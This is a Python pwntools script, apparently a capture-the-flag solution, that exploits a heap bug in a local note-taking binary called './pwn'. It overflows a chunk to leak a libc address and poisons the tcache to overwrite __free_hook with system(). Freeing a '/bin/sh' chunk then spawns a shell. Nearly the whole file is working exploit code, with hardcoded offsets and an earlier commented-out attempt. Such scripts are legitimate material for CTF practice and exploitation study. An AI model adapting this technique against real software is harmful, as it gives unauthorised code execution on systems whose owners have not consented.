from pwn import *

r = process("./pwn")
context(log_level = 'debug')

first_debug = 1
def debug():
    global first_debug
    if first_debug:
        gdb.attach(r)
        first_debug = 0
    pause()

template = b'{"index":__INDEX__,"length":__LENGTH__,"choice":"__CHOICE__","message":"__MESSAGE__"}'
wrapper = b"$$@@*!#((@!#(@*#*!@%s!@)#*!(@#!)@#*!(@*#!*@(#*("
default = {
    b'__INDEX__':   b'0',
    b'__LENGTH__':  b'48',
    b'__CHOICE__':  b'new',
    b'__MESSAGE__': b'hahaha'
}

def msg(index = None, length = None, choice = None, message = None):
    data = default.copy()
    ret = template
    for key, entry in zip(default.keys(), [index, length, choice, message]):
        data.update({key: default[key] if entry is None else entry})
    for key, value in data.items():
        ret = ret.replace(key, wrapper % value)
    for key, value in data.items():
        ret = ret.replace(wrapper % value, value)
    return ret

def add(length, message):
    r.sendlineafter(b'Please input:', msg(length = str(length).encode(), message = message, choice = b'new'))
    return (lambda arr: (int(arr[0], 0), arr[1]))(r.recvuntil(b'-->new message', drop = 1).strip().split(b'\n'))

def delete(index):
    r.sendlineafter(b'Please input:', msg(index = str(index).encode(), choice = b'rm'))

def edit(index, length, message):
    r.sendlineafter(b'Please input:', msg(index = str(index).encode(), length = str(length).encode(), message = message, choice = b'modify'))

def view(index):
    r.sendlineafter(b'Please input:', msg(index = str(index).encode(), choice = b'view'))
    r.recvuntil(b'message:')
    return r.recvuntil(b'-->new message', drop = 1).strip()

def bye():
    r.sendlineafter(b'Please input:', msg(choice = b'quit'))

'''
suffix0, _ = add(0x58, b'hahahahaaa')
suffix1, _ = add(0x58, b'hahahahaaa')
suffix2, _ = add(0x58, b'hahahahaaa')
delete(0)
delete(1)
delete(2)
base = u64(view(1).ljust(8, b'\0')) - suffix0
suffix3, _ = add(0x58, b'ccc')
edit(1, 6, p64(base + suffix3 - 0xf)[:6])
success('victim: ' + hex(base + suffix3 - 0xf))
#debug()
suffix4, _ = add(0x58, b'ddd')
suffix5, _ = add(0x58, b'eee')
#debug()
edit(5, 7+2, b'a'*7+p64(1073)[:2])
#debug()
suffix6, _ = add(1024, b'fff')
debug()
delete(3)
success(hex(suffix3))
success(hex(suffix4))
success(hex(suffix5))
success(hex(suffix6))
#success(hex(u64(view(3).ljust(8,b'\0'))))

debug()
'''

suffix0, _ = add(0x308, b'hahahahaaa')
suffix1, _ = add(0x58, b'hahahahaaa')
suffix2, _ = add(1024, b'hahahahaaa')
edit(0, 0x558+2, b'a'*(0x558)+p64(1729)[:2])
delete(1)
for _ in range(30): view(0)
edit(1, 0x15*8, b'a'*0x15*8)
success(hex(suffix1))
libc_base = u64(view(1).split(b'a'*0x15*8)[1].ljust(8, b'\0')) - 0x1ecbe0
free_hook = libc_base + 0x1EEE48
system = libc_base + 0x52290
#debug()

suffix3, _ = add(0x68, b'hahahahaaa')
suffix4, _ = add(0x68, b'hahahahaaa')
delete(4)
delete(3)
edit(3, 6, p64(free_hook)[:6])
suffix5, _ = add(0x68, b'/bin/sh')
suffix6, _ = add(0x68, p64(system)[:6])
success('Libc Base: %s' % hex(libc_base))
success('Victim: %s' % hex(free_hook))

#debug()
delete(5)

r.interactive()
r.close()